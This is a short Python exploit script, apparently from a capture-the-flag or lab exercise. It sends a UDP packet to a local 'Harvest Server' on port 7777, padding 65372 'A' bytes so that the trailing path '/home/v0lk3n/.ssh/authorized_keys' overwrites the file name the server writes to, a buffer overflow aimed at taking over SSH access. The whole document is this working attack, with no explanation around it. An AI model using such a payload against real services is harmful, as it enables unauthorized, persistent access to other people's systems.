import socket
import time

buffer_size = 65372

HOST = '0:0:0:0:0:0:0:1'
PORT = 7777

print("Connecting to Harvest Server...")
server = (HOST, PORT)
s = socket.socket(socket.AF_INET6, socket.SOCK_DGRAM)
s.connect(server)
print("Connected!")

buffer = b"A" * buffer_size + b"/home/v0lk3n/.ssh/authorized_keys"  # Control file name and path
print("Overwrite Filename")
s.send(buffer)
s.close()

